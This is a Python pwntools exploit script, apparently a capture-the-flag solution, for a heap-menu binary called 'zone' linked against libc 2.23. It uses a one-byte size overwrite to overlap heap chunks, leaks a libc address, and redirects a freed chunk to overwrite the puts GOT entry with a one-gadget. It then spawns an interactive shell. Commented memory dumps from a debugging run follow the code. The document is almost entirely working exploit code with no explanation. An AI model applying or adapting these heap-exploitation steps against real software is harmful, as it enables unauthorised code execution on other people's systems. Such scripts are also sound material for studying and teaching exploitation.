from pwn import *


r=process('./zone',env={"LD_PRELOAD": "./libc-2.23.so"})
libc = ELF('libc-2.23.so')
gdb.attach(r)

def allocate(size):
	r.sendline("1")
	r.sendline(str(size))
	r.recvuntil("5) Exit\n")
	sleep(1)


def delete():
	r.sendline("2")
	r.recvuntil("5) Exit\n")
	sleep(0.5)

def write(content):
	r.sendline("3")
	sleep(1)
	r.sendline(content)
	r.recvuntil("5) Exit\n")
pause()
r.recvuntil(": ")
env=r.recvuntil("\n")
env=int(env[:-1],16)
print "env :"+hex(env)
put_got=0x0000000000607020
allocate(0x40)
write("A"*0x40+"\x80")
allocate(0x40)
write("B"*0x40)
allocate(0x40)
write("C"*0x40)
delete()
delete()
allocate(0x80)
write("D"*(0x40)+"X"*8)

#leak libc
r.sendline("4")
r.recvuntil("XXXXXXXX")
leak=r.recvuntil("\n")
print len(leak)
print leak

leak=leak.ljust(8,"\x00")
leak=hex(u64(leak))

leak="0x"+leak[3:]
leak=int(leak,16)

print "leaked libc :"+hex(leak)
r.recvuntil("5) Exit\n")

put_lib=leak-5741152
libc_base=put_lib-libc.symbols['puts']
system=libc_base+libc.symbols['system']
one=libc_base+0x45216
print "libcbase : "+hex(libc_base)
print "puts : "+hex(put_lib)
print "system : "+hex(system)
print "one : "+hex(one)
delete()
allocate(0x80)
write("D"*(0x40)+"Q"*8+p64(put_got-0x10)+"R"*8+"S"*8)
allocate(0x40)
write("SSSSSSSS")
allocate(0x40)
print "[+] write one gadget"
r.sendline("3")
sleep(1)
r.sendline(p64(one))
r.sendline("ls -al")

r.interactive()

#with write("ZZZZZZZZ")
# env :0x7fffc2f7b540
# 7

# leaked libc :0x7f67c34370f0
# libcbase : 0x7f67c2e4e000
# puts : 0x7f67c2ebd690
# one : 0x7f67c2e93216

# 0x607020:	0x00007f67c2ebd690	0x0000000000000000
# 0x607030:	0x5a5a5a5a5a5a5a5a	0x00007f67c2ebde70
# 0x607040:	0x00000000004009e6	0x00007f67c2f45220
# 0x607050:	0x00007f67c2e6e740	0x00007f67c2eb87e0
# 0x607060:	0x0000000000400a26	0x0000000000400a36
# 0x607070:	0x0000000000400a46	0x0000000000400a56
# 0x607080:	0x0000000000400a66	0x0000000000400a76
# 0x607090:	0x0000000000400a86	0x00007f67c2b5b790
# 0x6070a0:	0x0000000000400aa6	0x00007f67c2f4f640
# 0x6070b0:	0x0000000000000000	0x0000000000000000
# 0x6070c0 <stdout>:	0x00007f67c3213620	0x0000000000000000
# 0x6070d0:	0x0000000000000000	0x0000000000000000
# 0x6070e0:	0x0000000000000000	0x0000000000000000
# 0x6070f0:	0x0000000000000000	0x0000000000000000
# 0x607100:	0x0000000000000000	0x0000000000000000
# 0x607110:	0x0000000000000000	0x0000000000000000
# 0x607120:	0x0000000000000000	0x0000000000000000
# 0x607130:	0x0000000000000000	0x0000000000000000
# 0x607140:	0x0000000000000000	0x0000000000000000
# 0x607150:	0x0000000000000000	0x0000000000000000

